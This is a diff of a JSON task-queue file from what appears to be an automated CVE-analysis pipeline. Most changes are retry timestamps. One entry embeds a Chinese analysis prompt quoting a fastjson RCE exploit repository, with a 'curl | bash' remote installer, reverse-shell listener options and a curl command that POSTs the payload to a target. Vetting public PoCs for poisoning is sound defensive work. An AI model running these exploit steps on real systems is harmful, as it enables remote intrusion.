@@ -10,7 +10,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786900352.1803179,
     "last_attempt": 1786904169.0399828,
-    "next_attempt": 1786918361.315251,
+    "next_attempt": 1786921928.196084,
     "metadata": {},
     "task_id": "task_CVE-2026-43499_1786900352",
     "required_result_fields": [
@@ -39,7 +39,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786900358.6316214,
     "last_attempt": 1786904173.9332821,
-    "next_attempt": 1786918362.8900356,
+    "next_attempt": 1786921923.8223221,
     "metadata": {},
     "task_id": "task_CVE-2026-64561_1786900358",
     "required_result_fields": [
@@ -68,7 +68,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786904146.4223058,
     "last_attempt": 1786904164.0371904,
-    "next_attempt": 1786918338.6988683,
+    "next_attempt": 1786921904.28934,
     "metadata": {},
     "task_id": "task_CVE-2026-3611_1786904146",
     "required_result_fields": [
@@ -97,7 +97,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786904151.7235196,
     "last_attempt": 1786904173.9345129,
-    "next_attempt": 1786918341.3969665,
+    "next_attempt": 1786921902.1556957,
     "metadata": {},
     "task_id": "task_CVE-2026-24060_1786904151",
     "required_result_fields": [
@@ -126,7 +126,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786904164.0351887,
     "last_attempt": 1786904173.9373932,
-    "next_attempt": 1786918332.0568514,
+    "next_attempt": 1786921892.2455385,
     "metadata": {},
     "task_id": "task_CVE-2025-1727_1786904164",
     "required_result_fields": [
@@ -155,7 +155,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786904169.0751853,
     "last_attempt": 1786914730.515055,
-    "next_attempt": 1786918332.7786524,
+    "next_attempt": 1786921892.76119,
     "metadata": {},
     "task_id": "task_CVE-2026-8508_1786904169",
     "required_result_fields": [
@@ -184,7 +184,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786904173.9308047,
     "last_attempt": 1786914730.516103,
-    "next_attempt": 1786918330.3473892,
+    "next_attempt": 1786921891.3840234,
     "metadata": {},
     "task_id": "task_CVE-2026-6837_1786904173",
     "required_result_fields": [
@@ -213,7 +213,7 @@
     "last_error": "API返回空结果",
     "created_at": 1786914731.4258726,
     "last_attempt": 1786918326.5318692,
-    "next_attempt": 1786918337.6338842,
+    "next_attempt": 1786921890.9848871,
     "metadata": {},
     "task_id": "task_CVE-2026-26980_1786914731",
     "required_result_fields": [
@@ -234,15 +234,15 @@
   {
     "cve_id": "CVE-2026-16723",
     "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-16723\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"A remote code execution (RCE) vulnerability exists in fastjson 1.2.68 through 1.2.83. This vulnerability is exploitable under fastjson's\\u00a0stock default configuration\\u00a0\\u2014 no AutoType enablement required, no classpath gadget required.\", \"\\u6807\\u9898: Fastjson 1.2.68-1.2.83\\u8fdc\\u7a0b\\u4ee3\\u7801\\u6267\\u884c\\u6f0f\\u6d1e\"], \"published_date\": \"2026-07-23T09:16:26.700\", \"last_modified_date\": \"2026-07-23T15:01:24.377\", \"cvss_score\": 9.0, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"a\", \"l\", \"i\", \"b\", \"a\", \"b\", \"a\", \"/\", \"f\", \"a\", \"s\", \"t\", \"j\", \"s\", \"o\", \"n\", \"2\", \"/\", \"w\", \"i\", \"k\", \"i\", \"/\", \"S\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"-\", \"A\", \"d\", \"v\", \"i\", \"s\", \"o\", \"r\", \"y\", \":\", \"-\", \"R\", \"e\", \"m\", \"o\", \"t\", \"e\", \"-\", \"C\", \"o\", \"d\", \"e\", \"-\", \"E\", \"x\", \"e\", \"c\", \"u\", \"t\", \"i\", \"o\", \"n\", \"-\", \"i\", \"n\", \"-\", \"f\", \"a\", \"s\", \"t\", \"j\", \"s\", \"o\", \"n\", \"-\", \"1\", \".\", \"2\", \".\", \"6\", \"8\", \"%\", \"E\", \"2\", \"%\", \"8\", \"0\", \"%\", \"9\", \"3\", \"1\", \".\", \"2\", \".\", \"8\", \"3\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] Active Exploitation Alert: Critical FastJson CVE-2026-16723 Zero-Day RCE Targeting US Organizations in Spring Boot Applications – Rescana\n [description] 3 weeks ago - Current exploitation of CVE-2026-16723 is characterized by widespread, opportunistic activity rather than targeted campaigns by a specific advanced persistent threat (APT) group. Analysis from ThreatBook and Imperva indicates that multiple, ...\n [link] https://www.rescana.com/post/active-exploitation-alert-critical-fastjson-cve-2026-16723-zero-day-rce-targeting-us-organizations-in-spring-boot-applic\n [webpage 0 end]\n[webpage 1 begin] [title] CVE Record: CVE-2026-16723\n [description] 4 weeks ago - Common vulnerabilities and Exposures (CVE) · We're sorry but the CVE Website doesn't work properly without JavaScript enabled. Please enable it to continue\n [link] https://www.cve.org/CVERecord?id=CVE-2026-16723\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2026-16723 - Exploits & Severity - Feedly\n [description] CVE-2026-16723: Remote code execution (RCE) vulnerability exists in fastjson 1.2.68 through 1.2.83. This vulnerability is exploitable under fastjson's stock default configuration. PoC github.com/learner330/fastjs…\n [link] https://feedly.com/cve/CVE-2026-16723\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-16723 - Critical Vulnerability - TheHackerWire\n [description] 4 weeks ago - CVE-2026-16723 is a Critical severity vulnerability (CVSS 9). A remote code execution (RCE) vulnerability exists in fastjson 1.2.68 through 1.2.83. This vulnerability is exploitable under fastjson's stock default configuration —...\n [link] https://www.thehackerwire.com/vulnerability/CVE-2026-16723/\n [webpage 3 end]\n[webpage 4 begin] [title] GitHub - SecureWithUmer/CVE-2026-PoCs: A community-curated, verified collection of Proof-of-Concept exploits for CVEs disclosed in 2026. · GitHub\n [description] A community-curated, verified collection of Proof-of-Concept exploits for CVEs disclosed in 2026. - SecureWithUmer/CVE-2026-PoCs\n [link] https://github.com/SecureWithUmer/CVE-2026-PoCs\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/945ceaf3e97b19d04538ad7c1bbed8ca/CMakeLists.txt\n---\ncmake_minimum_required(VERSION 3.10)\nproject(CVE-2026-16723)\n\nset(CMAKE_CXX_STANDARD 17)\nset(CMAKE_CXX_STANDARD_REQUIRED ON)\n\nfind_package(ZLIB REQUIRED)\nfind_package(LibZip REQUIRED)\n\ninclude_directories(${CMAKE_SOURCE_DIR}/external/include)\n\nadd_executable(exploit\n    src/main.cpp\n    src/class_builder.cpp\n)\n\ntarget_link_libraries(exploit zip z)\n\n\n---\n/tmp/945ceaf3e97b19d04538ad7c1bbed8ca/README.md\n---\n# CVE-2026-16723 Exploit\n\nA standalone C++17 implementation for **CVE-2026-16723**, a critical vulnerability affecting **Fastjson** versions **1.2.68 – 1.2.83**.\n---\n\n## Requirements\n\n* Linux (or WSL on Windows)\n* C++17 compatible compiler (GCC 7+ or Clang 5+)\n* CMake 3.10 or newer\n* System packages:\n\n  * `libzip-dev`\n  * `zlib1g-dev`\n\n### Debian / Ubuntu\n\n```bash\nsudo apt update\nsudo apt install -y build-essential cmake libzip-dev zlib1g-dev\n```\n\n---\n\n## Installation\n\n### Quick Install (Recommended)\n\nInstall everything with a single command:\n\n```bash\ncurl -sSL https://raw.githubusercontent.com/1xPwn/CVE-2026-16723/main/install.sh | bash\n```\n\nOr download and execute the installer manually:\n\n```bash\nwget https://raw.githubusercontent.com/1xPwn/CVE-2026-16723/main/install.sh\nchmod +x install.sh\n./install.sh\n```\n\nThe installation script will:\n\n* Install all required system packages.\n* Download the required header-only libraries:\n\n  * `nlohmann/json`\n  * `cpp-httplib`\n* Build the project.\n* Place the compiled binary in the current directory as:\n\n```text\n./exploit\n```\n\n---\n\n## Manual Build\n\nIf you cloned the repository:\n\n```bash\ngit clone https://github.com/1xPwn/CVE-2026-16723.git\ncd CVE-2026-16723\n./install.sh\n```\n\nOr build manually:\n\n```bash\nmkdir build\ncd build\n\ncmake ..\nmake -j$(nproc)\n\ncp exploit ../\n```\n\n---\n\n## Usage\n\nRun the binary:\n\n```bash\n./exploit --lhost <YOUR_IP> --lport <SHELL_PORT> [options]\n```\n\n### Example\n\n```bash\n./exploit --lhost 192.168.1.100 --lport 4444 --http-port 8000\n```\n\nAfter execution the following files will be created:\n\n```text\nx\nbody.json\n```\n\nThe HTTP server will start on the configured port (default: **8000**) and the tool will wait for an incoming reverse shell connection.\n\n---\n\n## Sending the Payload\n\nSend the generated `body.json` file to the vulnerable endpoint:\n\n```bash\ncurl -X POST http://<TARGET_IP>:8080/api/products/search \\\n     -H \"Content-Type: application/json\" \\\n     --data-binary @body.json\n```\n\nIf the application expects a different JSON field, specify it using the `--field` option.\n\n---\n\n## Command-Line Options\n\n| Option         | Description                  | Default  |\n| -------------- | ---------------------------- | -------- |\n| `--lhost`      | Local IP address             | Required |\n| `--lport`      | Reverse shell listening port | `4444`   |\n| `--http-port`  | HTTP server port             | `8000`   |\n| `--first`      | First file descriptor to try | `3`      |\n| `--last`       | Last file descriptor to try  | `30`     |\n| `--field`      | JSON field name              | `facets` |\n| `--outdir`     | Output directory             | `.`      |\n| `-h`, `--help` | Show help message            | —        |\n\n---\n\n## Output Files\n\n| File        | Description                        |\n| ----------- | ---------------------------------- |\n| `x`         | Generated JAR payload              |\n| `body.json` | JSON payload to send to the target |\n\n---\n\n## Notes\n\n* This project is intended **only for authorized security testing and educational purposes**.\n* The implementation forces the target application to download and load a remote JAR using the `jar:http` and `jar:file` protocols.\n* The reverse shell command is Base64-encoded to reduce escaping issues.\n\n\n\n## Follow Me on Twitter(X)\n* [MNM](https://x.com/1xPwn)\n\n---\n/tmp/945ceaf3e97b19d04538ad7c1bbed8ca/install.sh\n---\n#!/bin/bash\nset -e\n\nRED='\\033[0;31m'\nGREEN='\\033[0;32m'\nNC='\\033[0m'\n\nREPO_URL=\"https://github.com/Nowafen/CVE-2026-16723.git\"\nREPO_NAME=\"CVE-2026-16723\"\n\nif [ ! -f \"CMakeLists.txt\" ] || [ ! -d \"src\" ]; then\n    echo -e \"${GREEN}[*] Repository not found. Cloning from $REPO_URL ...${NC}\"\n    git clone \"$REPO_URL\"\n    cd \"$REPO_NAME\"\nelse\n    echo -e \"${GREEN}[*] Using existing repository.${NC}\"\nfi\n\necho -e \"${GREEN}[*] Installing system dependencies...${NC}\"\nsudo apt update\nsudo apt install -y build-essential cmake libzip-dev zlib1g-dev\n\necho -e \"${GREEN}[*] Downloading header-only libraries...${NC}\"\nmkdir -p external/include\ncd external/include\nwget -q https://raw.githubusercontent.com/nlohmann/json/develop/single_include/nlohmann/json.hpp -O json.hpp\nwget -q https://raw.githubusercontent.com/yhirose/cpp-httplib/master/httplib.h -O httplib.h\ncd ../..\n\necho -e \"${GREEN}[*] Building the exploit...${NC}\"\nmkdir -p build\ncd build\ncmake ..\nmake -j$(nproc)\ncp exploit ../\ncd ..\n\necho -e \"${GREEN}[+] Success! The exploit binary is at: $(pwd)/exploit${NC}\"\necho -e \"${GREEN}[+] Run it with: ./exploit --lhost <YOUR_IP> --lport <PORT>${NC}\"\n\n\n---\n/tmp/945cea\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
-    "retry_count": 0,
+    "retry_count": 1,
     "max_retries": 5,
     "priority": 2,
     "status": "pending",
-    "error_type": null,
-    "last_error": null,
+    "error_type": "client_error",
+    "last_error": "API返回空结果",
     "created_at": 1786918328.0560088,
-    "last_attempt": 0,
-    "next_attempt": 1786918332.9483979,
+    "last_attempt": 1786921886.708784,
+    "next_attempt": 1786921898.2246394,
     "metadata": {},
     "task_id": "task_CVE-2026-16723_1786918328",
     "required_result_fields": [
